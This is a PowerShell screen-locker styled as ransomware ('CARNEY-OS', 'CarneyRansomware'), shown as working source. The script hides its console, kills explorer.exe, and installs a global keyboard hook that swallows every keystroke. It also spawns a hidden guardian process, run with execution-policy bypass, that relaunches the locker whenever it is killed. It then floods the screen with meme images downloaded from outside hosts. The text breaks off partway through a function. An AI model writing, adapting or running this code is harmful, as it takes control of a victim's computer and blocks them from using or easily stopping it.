# ============================================================
# CARNEY-OS 6.6.6  --  FULL LOCKDOWN EDITION  (v5 - final)
# ------------------------------------------------------------
#  BOOT MENU -> 3x y/n confirm -> LOCKED RUN
#  Acts: kirk intro | secret screenshot->pixelate->shatter |
#        carney-os cli chaos + squares | lock screen
#  NO LETMEOUT. The only way out is to kill it (it comes back
#  to this menu) and press 7.
# ============================================================

param([switch]$Guardian, [string]$ScriptPath = "")

# ============================================================
# GUARDIAN MODE
# ============================================================
if ($Guardian) {
    $gMut = New-Object -TypeName System.Threading.Mutex -ArgumentList $false, "Local\CarneyRansomware_Guardian"
    $gOwn = $false
    try { $gOwn = $gMut.WaitOne(0) } catch { $gOwn = $true }
    if (-not $gOwn) { exit }
    $target = $ScriptPath
    if ([string]::IsNullOrWhiteSpace($target)) { $target = $PSCommandPath }
    $tempDir = $env:TEMP; if ([string]::IsNullOrWhiteSpace($tempDir)) { $tempDir = $env:TMP }
    $gpf = Join-Path $tempDir "carney_guardian.pid"
    $mpf = Join-Path $tempDir "carney_ransomware.pid"
    try { Set-Content -LiteralPath $gpf -Value $PID -Encoding ASCII } catch { }
    while ($true) {
        $alive = $false
        try {
            if (Test-Path -LiteralPath $mpf) {
                $mid = [int](Get-Content -LiteralPath $mpf -Raw).Trim()
                $null = Get-Process -Id $mid -ErrorAction Stop
                $alive = $true
            }
        } catch { $alive = $false }
        if (-not $alive) {
            Start-Sleep -Milliseconds 250
            try {
                Start-Process -FilePath "powershell.exe" -ArgumentList @(
                    "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-WindowStyle", "Hidden", "-File", "`"$target`""
                ) -WindowStyle Hidden | Out-Null
            } catch { }
            Start-Sleep -Milliseconds 750
        }
        Start-Sleep -Milliseconds 500
    }
    exit
}

# ============================================================
# SINGLE INSTANCE
# ============================================================
$script:MainMutex = New-Object -TypeName System.Threading.Mutex -ArgumentList $false, "Local\CarneyRansomware_Main"
$script:MainOwn = $false
try { $script:MainOwn = $script:MainMutex.WaitOne(0) } catch { $script:MainOwn = $true }
if (-not $script:MainOwn) { exit }

# ============================================================
# PATHS
# ============================================================
$script:TempDir = $env:TEMP; if ([string]::IsNullOrWhiteSpace($script:TempDir)) { $script:TempDir = $env:TMP }
$script:PidFile     = Join-Path $script:TempDir "carney_ransomware.pid"
$script:GuardianPid = Join-Path $script:TempDir "carney_guardian.pid"
$script:LaunchPath = $PSCommandPath
if ([string]::IsNullOrWhiteSpace($script:LaunchPath)) { $script:LaunchPath = $MyInvocation.MyCommand.Path }
if ([string]::IsNullOrWhiteSpace($script:LaunchPath)) {
    $script:LaunchPath = Join-Path $script:TempDir "carney_ransomware_autostart.ps1"
    try { $MyInvocation.MyCommand.ScriptBlock.ToString() | Set-Content -LiteralPath $script:LaunchPath -Encoding UTF8 } catch { }
}
try { Set-Content -LiteralPath $script:PidFile -Value $PID -Encoding ASCII } catch { }

# ============================================================
# HIDE CONSOLE + MINIMIZE + KILL EXPLORER
# ============================================================
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class CarneyShell
{
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public const int SW_HIDE = 0;
}
"@
$console = [CarneyShell]::GetConsoleWindow()
if ($console -ne [IntPtr]::Zero) { [CarneyShell]::ShowWindow($console, [CarneyShell]::SW_HIDE) }
try { $shell = New-Object -ComObject Shell.Application; $shell.MinimizeAll() } catch { }
function Stop-Explorer { try { Get-Process -Name explorer -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { } }
function Start-Explorer { try { if (-not (Get-Process -Name explorer -ErrorAction SilentlyContinue)) { Start-Process "explorer.exe" } } catch { } }
Stop-Explorer

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ============================================================
# NATIVE
# ============================================================
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class CarneyNative
{
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    public const int GWL_EXSTYLE = -20;
    public const int WS_EX_TRANSPARENT = 0x00000020;
    public const int WS_EX_LAYERED = 0x00080000;
    public const int WS_EX_TOOLWINDOW = 0x00000080;
    public const int WS_EX_NOACTIVATE = 0x08000000;
}
"@
[CarneyNative]::SetProcessDPIAware() | Out-Null

# ============================================================
# GLOBAL KEYBOARD HOOK  (swallows EVERY key, always)
# ============================================================
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class CarneyHook
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr dwExtraInfo; }
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    public static volatile bool SwallowAll = true;
    public static void Install() { if (_hookID == IntPtr.Zero) { _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0); } }
    public static void Uninstall() { if (_hookID != IntPtr.Zero) { UnhookWindowsHookEx(_hookID); _hookID = IntPtr.Zero; } }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (SwallowAll) { return (IntPtr)1; }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@

# ============================================================
# CONFIG + DULL PALETTE
# ============================================================
$script:BaseSize = 96
$script:IntroTileCount = 37
$script:IntroZoomMs    = 250
$script:IntroZoomFrom  = 0.75
$script:IntroHoldMs    = 1200

# per-mode timings (set by the boot menu)
$script:IntroBlankMs   = 6000
$script:IntroSpawnMs   = 12000
$script:CountdownSeconds = 60

$script:DoIntro  = $true
$script:DoShot   = $true
$script:DoChaos  = $true
$script:DoStage  = $true
$script:DoRansom = $true

$script:ColBg    = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(9, 11, 10))
$script:ColText  = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(126, 156, 122))
$script:ColDim   = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(74, 92, 74))
$script:ColAmber = [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(190, 158, 92))
$script:ColBright= [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(196, 214, 188))
$script:Mono = New-Object System.Windows.Media.FontFamily("Consolas")

$script:KirkBlank = "https://i.ibb.co/cKPCWKsG/Untitled-design-1.png"
$script:KirkWall  = "https://i.ibb.co/Q7HjXzPv/Untitled-design-2.png"
$script:KirkTile  = "https://i.ibb.co/TBtS3Rxz/Untitled-design.png"
$script:KirkMark  = "https://i.ibb.co/CKnmkNs2/mark-zuckerberg.png"
$script:FlashImageUrls = @(
    "https://i.ibb.co/tP44Qc0g/download.png",
    "https://i.ibb.co/1Y23WR0j/OIP.png",
    "https://i.ibb.co/hRw7VvLd/OIP-1.png"
)
$script:FlashImages = @()
$script:Images = @(
    "https://i.postimg.cc/jCJs0wG6/images.jpg",
    "https://i.postimg.cc/5Qv1wTBQ/images-(1).jpg",
    "https://i.postimg.cc/SY8qW36Q/images-(10).jpg",
    "https://i.postimg.cc/fSXZxpcw/images-(11).jpg",
    "https://i.postimg.cc/QK5spwQj/images-(12).jpg",
    "https://i.postimg.cc/YLgk1Z6M/images-(13).jpg",
    "https://i.postimg.cc/p58xD4fx/images-(14).jpg",
    "https://i.postimg.cc/q6n08Ssd/images-(15).jpg",
    "https://i.postimg.cc/tnPyhw3j/images-(16).jpg",
    "https://i.postimg.cc/dZdv8p2c/images-(17).jpg",
    "https://i.postimg.cc/wRJHhZXK/images-(18).jpg",
    "https://i.postimg.cc/XBF3wmwR/images-(19).jpg",
    "https://i.postimg.cc/JHJmbvNB/images-(2).jpg",
    "https://i.postimg.cc/0KmxpFYR/images-(20).jpg",
    "https://i.postimg.cc/N2TY1S1W/images-(21).jpg",
    "https://i.postimg.cc/Fkcmj8jw/images-(22).jpg",
    "https://i.postimg.cc/5Qv1wTBH/images-(3).jpg",
    "https://i.postimg.cc/gLRdvQVx/images-(4).jpg",
    "https://i.postimg.cc/PvZhm9WP/images-(5).jpg",
    "https://i.postimg.cc/2Lvm4MQ5/images-(6).jpg",
    "https://i.postimg.cc/Fkcmj8y1/images-(7).jpg",
    "https://i.postimg.cc/CnDYjXGx/images-(8).jpg",
    "https://i.postimg.cc/GTYrkVFh/images-(9).jpg"
)

# ============================================================
# GLOBAL STATE
# ============================================================
$script:Sprites = New-Object System.Collections.ArrayList
$script:Dancers = New-Object System.Collections.ArrayList
$script:Shards  = New-Object System.Collections.ArrayList
$script:StatusTasks = New-Object System.Collections.ArrayList
$script:ImageCache = @{}
$script:BadImages = @{}
$script:ImageBag = New-Object System.Collections.ArrayList
$script:NextSpriteId = 1
$script:LastPhaseSpriteId = $null
$script:KeyStates = @{}
$script:MouseStates = @{}
$script:MouseHistory = New-Object System.Collections.ArrayList
$script:Stage = $null; $script:Ransom = $null
$script:AllowClose = $false
$script:StagePhase = 0; $script:StagePhaseStart = [DateTime]::Now
$script:FlashTick = 0; $script:ImageFlashStep = 0; $script:TotalFlashSteps = 9
$script:RaiseAt = [DateTime]::MinValue; $script:LostAt = [DateTime]::MinValue
$script:TimeLeft1Block = $null; $script:TimeLeft2Block = $null
$script:IntroActive = $false; $script:Act2Active = $false; $script:ChaosActive = $false
$script:KirkRevived = $false
$script:CursorHidden = $false
$script:CliLog = New-Object System.Collections.ArrayList
$script:CliCurrent = ""; $script:CliTyped = 0; $script:CliNextAt = [DateTime]::Now
$script:ReviveValue = 0.0; $script:ReviveSpeed = 100.0 / 26.0
$script:SpinnerIdx = 0
$script:RunStarted = $false

# boot menu state
$script:MenuState = "menu"
$script:MenuChoice = 0
$script:PickIntro = $true; $script:PickShot = $true; $script:PickChaos = $true; $script:PickStage = $true; $script:PickRansom = $true
$script:MenuVK = @{}
$script:MenuCursor = 0

# ============================================================
# HELPERS
# ============================================================
function Get-RandomDouble { param([double]$Minimum,[double]$Maximum)
    $r = (Get-Random -Minimum 0 -Maximum 1000000) / 1000000.0
    return $Minimum + (($Maximum - $Minimum) * $r)
}
function Lerp { param([double]$A,[double]$B,[double]$T) return $A + (($B - $A) * $T) }
function Format-Span { param([TimeSpan]$Span)
    if ($Span.TotalSeconds -lt 0) { $Span = [TimeSpan]::Zero }
    return ("{0:00}:{1:00}:{2:00}:{3:00}" -f $Span.Days, $Span.Hours, $Span.Minutes, $Span.Seconds)
}
function Get-VirtualScreen { return [System.Windows.Forms.SystemInformation]::VirtualScreen }
function Get-CursorPoint { return [System.Windows.Forms.Cursor]::Position }
function Format-Bar { param([double]$Pct,[int]$W = 26)
    $f = [int][Math]::Round(($Pct / 100.0) * $W)
    if ($f -lt 0) { $f = 0 }; if ($f -gt $W) { $f = $W }
    return ("[" + [string]::new([char]'#', $f) + [string]::new([char]'.', ($W - $f)) + "]")
}
function Hide-Cursor { try { if (-not $script:CursorHidden) { [System.Windows.Forms.Cursor]::Hide(); $script:CursorHidden = $true } } catch { } }
function Show-Cursor { try { if ($script:CursorHidden) { [System.Windows.Forms.Cursor]::Show(); $script:CursorHidden = $false } } catch { } }
function KeyHit { param([int]$vk)
    $down = (([CarneyNative]::GetAsyncKeyState($vk) -band 0x8000) -ne 0)
    $was = $false
    if ($script:MenuVK.ContainsKey($vk)) { $was = $script:MenuVK[$vk] }
    $script:MenuVK[$vk] = $down
    return ($down -and -not $was)
}

function Refill-ImageBag {
    $script:ImageBag.Clear()
    $available = @($script:Images | Where-Object { -not $script:BadImages.ContainsKey($_) })
    while ($available.Count -gt 0) {
        $index = Get-Random -Minimum 0 -Maximum $available.Count
        [void]$script:ImageBag.Add($available[$index])
        $newArray = New-Object System.Collections.ArrayList
        for ($i = 0; $i -lt $available.Count; $i++) { if ($i -ne $index) { [void]$newArray.Add($available[$i]) } }
        $available = @($newArray)
    }
}
function Get-NextImageUrl {
    if ($script:ImageBag.Count -eq 0) { Refill-ImageBag }
    if ($script:ImageBag.Count -eq 0) { return $null }
    $url = $script:ImageBag[0]; $script:ImageBag.RemoveAt(0); return $url
}
function Get-ImageSource {
    param([string]$Url)
    if ($script:ImageCache.ContainsKey($Url)) { return $script:ImageCache[$Url] }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    try {
        $webClient.Headers.Add([System.Net.HttpRequestHeader]::UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $bytes = $webClient.DownloadData($Url)
    } finally { $webClient.Dispose() }
    $stream = New-Object System.IO.MemoryStream
    $stream.Write($bytes, 0, $bytes.Length); $stream.Position = 0
    $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
    $bitmap.BeginInit(); $bitmap.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $bitmap.StreamSource = $stream; $bitmap.EndInit(); $bitmap.Freeze()
    $stream.Dispose()
    $script:ImageCache[$Url] = $bitmap
    return $bitmap
}
function Update-MouseHistory { param([DateTime]$Now)
    $p = Get-CursorPoint
    [void]$script:MouseHistory.Add([PSCustomObject]@{ Time = $Now; X = [double]$p.X; Y = [double]$p.Y })
    while ($script:MouseHistory.Count -gt 0) {
        if (($Now - $script:MouseHistory[0].Time).TotalSeconds -gt 3.0) { $script:MouseHistory.RemoveAt(0) } else { break }
    }
}
function Get-DelayedMousePosition { param([DateTime]$Now,[double]$DelaySeconds)
    if ($script:MouseHistory.Count -eq 0) { $p = Get-CursorPoint; return [PSCustomObject]@{ X = [double]$p.X; Y = [double]$p.Y } }
    $targetTime = $Now.AddSeconds(-$DelaySeconds)
    for ($i = $script:MouseHistory.Count - 1; $i -ge 0; $i--) {
        if ($script:MouseHistory[$i].Time -le $targetTime) { return [PSCustomObject]@{ X = $script:MouseHistory[$i].X; Y = $script:MouseHistory[$i].Y } }
    }
    return [PSCustomObject]@{ X = $script:MouseHistory[0].X; Y = $script:MouseHistory[0].Y }
}
function Reset-SpriteVisual { param($Sprite)
    $Sprite.Scale.ScaleX = 1; $Sprite.Scale.ScaleY = 1; $Sprite.Rotate.Angle = 0; $Sprite.Image.Clip = $null
}
function Set-SpritePosition { param($Sprite)
    $desktop = Get-VirtualScreen
    [System.Windows.Controls.Canvas]::SetLeft($Sprite.Image, ($Sprite.X - $desktop.Left))
    [System.Windows.Controls.Canvas]::SetTop($Sprite.Image, ($Sprite.Y - $desktop.Top))
}

# ============================================================
# SPRITE PHASES  (unchanged)
# ============================================================
function Initialize-Phase { param($Sprite,[int]$Phase)
    $Sprite.Phase = $Phase; $Sprite.PhaseStarted = [DateTime]::Now
    $Sprite.PhaseDuration = Get-RandomDouble -Minimum 9.0 -Maximum 10.0
    Reset-SpriteVisual -Sprite $Sprite
    $screen = Get-VirtualScreen
    $Sprite.State.PhaseTime = 0
    $Sprite.State.Offset = Get-RandomDouble -Minimum 0 -Maximum 6.283185307
    switch ($Phase) {
        1 { $Sprite.State.Delay = 1.0 }
        2 { $Sprite.State.Speed = [Math]::Max($screen.Width, $screen.Height) / 5.0 }
        3 {
            $point = New-Object System.Drawing.Point
            $point.X = [int]($Sprite.X + ($script:BaseSize / 2)); $point.Y = [int]($Sprite.Y + ($script:BaseSize / 2))
            $monitor = [System.Windows.Forms.Screen]::FromPoint($point).Bounds
            $Sprite.State.Screen = $monitor
            $bottomLength = $monitor.Width - $script:BaseSize; $rightLength = $monitor.Height - $script:BaseSize
            $cx = $Sprite.X + ($script:BaseSize / 2); $cy = $Sprite.Y + ($script:BaseSize / 2)
            $leftDistance = [Math]::Abs($cx - $monitor.Left); $rightDistance = [Math]::Abs($cx - ($monitor.Right - $script:BaseSize))
            $topDistance = [Math]::Abs($cy - $monitor.Top); $bottomDistance = [Math]::Abs($cy - ($monitor.Bottom - $script:BaseSize))
            $minDistance = [Math]::Min([Math]::Min($leftDistance, $rightDistance), [Math]::Min($topDistance, $bottomDistance))
            if ($minDistance -eq $bottomDistance) { $Sprite.State.EdgeDistance = [Math]::Max(0, [Math]::Min($bottomLength, $Sprite.X - $monitor.Left)) }
            elseif ($minDistance -eq $rightDistance) { $Sprite.State.EdgeDistance = $bottomLength + [Math]::Max(0, [Math]::Min($rightLength, ($monitor.Bottom - $script:BaseSize) - $Sprite.Y)) }
            elseif ($minDistance -eq $topDistance) { $Sprite.State.EdgeDistance = $bottomLength + $rightLength + [Math]::Max(0, [Math]::Min($rightLength, ($monitor.Right - $script:BaseSize) - $Sprite.X)) }
            else { $Sprite.State.EdgeDistance = $bottomLength + $rightLength + $bottomLength + [Math]::Max(0, [Math]::Min($rightLength, $Sprite.Y - $monitor.Top)) }
            $Sprite.State.EdgeSpeed = 240.0
        }
        4 {
            $Sprite.State.TargetX = Get-RandomDouble -Minimum ($screen.Left + 20) -Maximum ($screen.Right - $script:BaseSize - 20)
            $Sprite.State.TargetY = Get-RandomDouble -Minimum ($screen.Top + 20) -Maximum ($screen.Bottom - $script:BaseSize - 20)
            $Sprite.State.NextTarget = [DateTime]::Now.AddSeconds((Get-RandomDouble -Minimum 1.3 -Maximum 2.8))
        }
        5 { $Sprite.State.ScaleTime = 0.0 }
        6 {
            $Sprite.State.VX = Get-RandomDouble -Minimum 280 -Maximum 520; $Sprite.State.VY = Get-RandomDouble -Minimum 280 -Maximum 520
            if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { $Sprite.State.VX *= -1 }
            if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { $Sprite.State.VY *= -1 }
            $ellipse = New-Object System.Windows.Media.EllipseGeometry
            $ellipse.Center = [System.Windows.Point]::new(48, 48); $ellipse.RadiusX = 48; $ellipse.RadiusY = 48
            $Sprite.Image.Clip = $ellipse
        }
        7 {
            $Sprite.State.VX = Get-RandomDouble -Minimum 100 -Maximum 320
            if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) { $Sprite.State.VX *= -1 }
            $Sprite.State.VY = -1 * (Get-RandomDouble -Minimum 650 -Maximum 900)
            $Sprite.State.Gravity = 1300.0
        }
        8 {
            $Sprite.State.CycleTime = Get-RandomDouble -Minimum 0 -Maximum 4
            $Sprite.State.AnchorX = $Sprite.X; $Sprite.State.AnchorY = $Sprite.Y
            $Sprite.State.SwayX = Get-RandomDouble -Minimum 15 -Maximum 40; $Sprite.State.SwayY = Get-RandomDouble -Minimum 10 -Maximum 30
        }
        9 { }
        10 {
            $Sprite.State.AnchorX = $Sprite.X; $Sprite.State.AnchorY = $Sprite.Y
            $Sprite.State.SpinSpeed = Get-RandomDouble -Minimum 180 -Maximum 360
            $Sprite.State.SwayX = Get-RandomDouble -Minimum 15 -Maximum 35; $Sprite.State.SwayY = Get-RandomDouble -Minimum 10 -Maximum 25
        }
    }
}
function Spawn-Sprite { param([double]$SpawnX = [double]::NegativeInfinity,[double]$SpawnY = [double]::NegativeInfinity)
    $url = $null; $bitmap = $null
    for ($attempt = 0; $attempt -lt $script:Images.Count; $attempt++) {
        $url = Get-NextImageUrl
        if ($url -eq $null) { return }
        try { $bitmap = Get-ImageSource -Url $url; break } catch { $script:BadImages[$url] = $true; $bitmap = $null }
    }
    if ($bitmap -eq $null) { return }
    if ([double]::IsNegativeInfinity($SpawnX)) { $cursor = Get-CursorPoint; $spawnCenterX = [double]$cursor.X; $spawnCenterY = [double]$cursor.Y }
    else { $spawnCenterX = $SpawnX; $spawnCenterY = $SpawnY }
    $image = New-Object System.Windows.Controls.Image
    $image.Source = $bitmap; $image.Width = $script:BaseSize; $image.Height = $script:BaseSize
    $image.Stretch = [System.Windows.Media.Stretch]::Fill
    $image.IsHitTestVisible = $false
    $image.Opacity = 0.94
    $scale = New-Object System.Windows.Media.ScaleTransform; $rotate = New-Object System.Windows.Media.RotateTransform
    $group = New-Object System.Windows.Media.TransformGroup
    [void]$group.Children.Add($scale); [void]$group.Children.Add($rotate)
    $image.RenderTransform = $group; $image.RenderTransformOrigin = [System.Windows.Point]::new(0.5, 0.5)
    $sprite = [PSCustomObject]@{
        Id = $script:NextSpriteId; Url = $url; Image = $image
        X = [double]($spawnCenterX - ($script:BaseSize / 2)); Y = [double]($spawnCenterY - ($script:BaseSize / 2))
        Phase = 1; PhaseStarted = [DateTime]::Now; PhaseDuration = 10.0
        Scale = $scale; Rotate = $rotate; State = @{}
    }
    $script:NextSpriteId++
    [void]$script:Canvas.Children.Add($image)
    [void]$script:Sprites.Add($sprite)
    Initialize-Phase -Sprite $sprite -Phase (Get-Random -Minimum 1 -Maximum 11)
    Set-SpritePosition -Sprite $sprite
}
function Update-Sprite { param($Sprite,[double]$DeltaTime,[DateTime]$Now)
    $screen = Get-VirtualScreen
    $Sprite.State.PhaseTime = ($Now - $Sprite.PhaseStarted).TotalSeconds
    $t = $Sprite.State.PhaseTime
    switch ($Sprite.Phase) {
        1 { $target = Get-DelayedMousePosition -Now $Now -DelaySeconds 1.0; $Sprite.X = $target.X - ($script:BaseSize / 2); $Sprite.Y = $target.Y - ($script:BaseSize / 2) }
        2 {
            $cursor = Get-CursorPoint
            $centerX = $Sprite.X + ($script:BaseSize / 2); $centerY = $Sprite.Y + ($script:BaseSize / 2)
            $dx = [double]$cursor.X - $centerX; $dy = [double]$cursor.Y - $centerY
            $distance = [Math]::Sqrt(($dx * $dx) + ($dy * $dy))
            if ($distance -gt 0.5) { $step = $Sprite.State.Speed * $DeltaTime; $factor = [Math]::Min(1.0, ($step / $distance)); $Sprite.X += $dx * $factor; $Sprite.Y += $dy * $factor }
        }
        3 {
            $r = $Sprite.State.Screen
            $bottomLength = $r.Width - $script:BaseSize; $rightLength = $r.Height - $script:BaseSize
            $perimeter = ($bottomLength * 2) + ($rightLength * 2)
            $Sprite.State.EdgeDistance += $Sprite.State.EdgeSpeed * $DeltaTime
            while ($Sprite.State.EdgeDistance -ge $perimeter) { $Sprite.State.EdgeDistance -= $perimeter }
            $d = $Sprite.State.EdgeDistance
            if ($d -lt $bottomLength) { $Sprite.X = $r.Left + $d; $Sprite.Y = $r.Top + $r.Height - $script:BaseSize; $Sprite.Rotate.Angle = 0 }
            elseif ($d -lt ($bottomLength + $rightLength)) { $local = $d - $bottomLength; $Sprite.X = $r.Left + $r.Width - $script:BaseSize; $Sprite.Y = $r.Top + $r.Height - $script:BaseSize - $local; $Sprite.Rotate.Angle = -90 }
            elseif ($d -lt ($bottomLength + $rightLength + $bottomLength)) { $local = $d - $bottomLength - $rightLength; $Sprite.X = $r.Left + $r.Width - $script:BaseSize - $local; $Sprite.Y = $r.Top; $Sprite.Rotate.Angle = 180 }
            else { $local = $d - $bottomLength - $rightLength - $bottomLength; $Sprite.X = $r.Left; $Sprite.Y = $r.Top + $local; $Sprite.Rotate.Angle = 90 }
        }
        4 {
            if ($Now -ge $Sprite.State.NextTarget) {
                $Sprite.State.TargetX = Get-RandomDouble -Minimum ($screen.Left + 20) -Maximum ($screen.Right - $script:BaseSize - 20)
                $Sprite.State.TargetY = Get-RandomDouble -Minimum ($screen.Top + 20) -Maximum ($screen.Bottom - $script:BaseSize - 20)
                $Sprite.State.NextTarget = $Now.AddSeconds((Get-RandomDouble -Minimum 1.4 -Maximum 3.0))
            }
            $dx = $Sprite.State.TargetX - $Sprite.X; $dy = $Sprite.State.TargetY - $Sprite.Y
            $ease = 1.0 - [Math]::Exp(-1.4 * $DeltaTime)
            $Sprite.X += $dx * $ease; $Sprite.Y += $dy * $ease
            $Sprite.Rotate.Angle = [Math]::Sin(($t * 2.2) + $Sprite.State.Offset) * 10
        }
        5 {
            $Sprite.State.ScaleTime += $DeltaTime; $st = $Sprite.State.ScaleTime
            if ($st -lt 2.5) { $scale = Lerp 1.0 4.0 ($st / 2.5) }
            elseif ($st -lt 5.5) { $scale = Lerp 4.0 0.25 (($st - 2.5) / 3.0) }
            else { $wave = ([Math]::Sin((($st - 5.5) / 1.5) * [Math]::PI * 2) + 1) / 2; $scale = Lerp 0.25 4.0 $wave }
            $Sprite.Scale.ScaleX = $scale; $Sprite.Scale.ScaleY = $scale
        }
        6 {
            $Sprite.X += $Sprite.State.VX * $DeltaTime; $Sprite.Y += $Sprite.State.VY * $DeltaTime
            $right = $screen.Right - $script:BaseSize; $bottom = $screen.Bottom - $script:BaseSize
            if ($Sprite.X -lt $screen.Left) { $Sprite.X = $screen.Left; $Sprite.State.VX = [Math]::Abs($Sprite.State.VX) }
            elseif ($Sprite.X -gt $right) { $Sprite.X = $right; $Sprite.State.VX = -1 * [Math]::Abs($Sprite.State.VX) }
            if ($Sprite.Y -lt $screen.Top) { $Sprite.Y = $screen.Top; $Sprite.State.VY = [Math]::Abs($Sprite.State.VY) }
            elseif ($Sprite.Y -gt $bottom) { $Sprite.Y = $bottom; $Sprite.State.VY = -1 * [Math]::Abs($Sprite.State.VY) }
            $Sprite.Rotate.Angle += 620 * $DeltaTime
        }
        7 {
            $Sprite.State.VY += $Sprite.State.Gravity * $DeltaTime
            $Sprite.X += $Sprite.State.VX * $DeltaTime; $Sprite.Y += $Sprite.State.VY * $DeltaTime
            $right = $screen.Right - $script:BaseSize; $floor = $screen.Bottom - $script:BaseSize
            if ($Sprite.X -lt $screen.Left) { $Sprite.X = $screen.Left; $Sprite.State.VX = [Math]::Abs($Sprite.State.VX) }
            elseif ($Sprite.X -gt $right) { $Sprite.X = $right; $Sprite.State.VX = -1 * [Math]::Abs($Sprite.State.VX) }
            if ($Sprite.Y -gt $floor) { $Sprite.Y = $floor; $Sprite.State.VY = -1 * [Math]::Abs($Sprite.State.VY) * 0.84; if ([Math]::Abs($Sprite.State.VY) -lt 350) { $Sprite.State.VY = -700 } }
            if ($Sprite.Y -lt $screen.Top) { $Sprite.Y = $screen.Top; if ($Sprite.State.VY -lt 0) { $Sprite.State.VY *= -0.7 } }
        }
        8 {
            $Sprite.State.CycleTime += $DeltaTime; $cycle = $Sprite.State.CycleTime % 4.0
            if ($cycle -lt 2.0) { $p = [Math]::Sin(($cycle / 2.0) * [Math]::PI); $Sprite.Scale.ScaleX = Lerp 1.0 2.5 $p; $Sprite.Scale.ScaleY = Lerp 1.0 0.75 $p }
            else { $p = [Math]::Sin((($cycle - 2.0) / 2.0) * [Math]::PI); $Sprite.Scale.ScaleX = Lerp 1.0 0.75 $p; $Sprite.Scale.ScaleY = Lerp 1.0 2.5 $p }
            $Sprite.X = $Sprite.State.AnchorX + ([Math]::Sin(($t * 1.3) + $Sprite.State.Offset) * $Sprite.State.SwayX)
            $Sprite.Y = $Sprite.State.AnchorY + ([Math]::Cos(($t * 1.7) + $Sprite.State.Offset) * $Sprite.State.SwayY)
            $Sprite.Rotate.Angle = [Math]::Sin(($t * 1.1) + $Sprite.State.Offset) * 8
        }
        9 { }
        10 {
            $Sprite.X = $Sprite.State.AnchorX + ([Math]::Sin(($t * 1.15) + $Sprite.State.Offset) * $Sprite.State.SwayX)
            $Sprite.Y = $Sprite.State.AnchorY + ([Math]::Cos(($t * 1.4) + $Sprite.State.Offset) * $Sprite.State.SwayY)
            $Sprite.Rotate.Angle += $Sprite.State.SpinSpeed * $DeltaTime
        }
    }
    Set-SpritePosition -Sprite $Sprite
}
function Try-Advance-OnePhase {
    $now = [DateTime]::Now
    $eligible = @($script:Sprites | Where-Object { ($now - $_.PhaseStarted).TotalSeconds -ge $_.PhaseDuration })
    if ($eligible.Count -eq 0) { return }
    if ($script:LastPhaseSpriteId -ne $null -and $eligible.Count -gt 1) {
        $filtered = @($eligible | Where-Object { $_.Id -ne $script:LastPhaseSpriteId })
        if ($filtered.Count -gt 0) { $eligible = $filtered }
    }
    $sprite = Get-Random -InputObject $eligible
    $nextPhase = $sprite.Phase + 1
    if ($nextPhase -gt 10) { $nextPhase = 1 }
    Initialize-Phase -Sprite $sprite -Phase $nextPhase
    $script:LastPhaseSpriteId = $sprite.Id
    Set-SpritePosition -Sprite $sprite
}

# ============================================================
# GUARDIAN + TASK
# ============================================================
function Start-Guardian {
    try {
        $p = Start-Process -FilePath "powershell.exe" -ArgumentList @(
            "-NoProfile", "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden", "-File", "`"$script:LaunchPath`"", "-Guardian"
        ) -WindowStyle Hidden -PassThru
        return $p.Id
    } catch { return 0 }
}
function Ensure-Guardian {
    $alive = $false
    try {
        if (Test-Path -LiteralPath $script:GuardianPid) {
            $gid = [int](Get-Content -LiteralPath $script:GuardianPid -Raw).Trim()
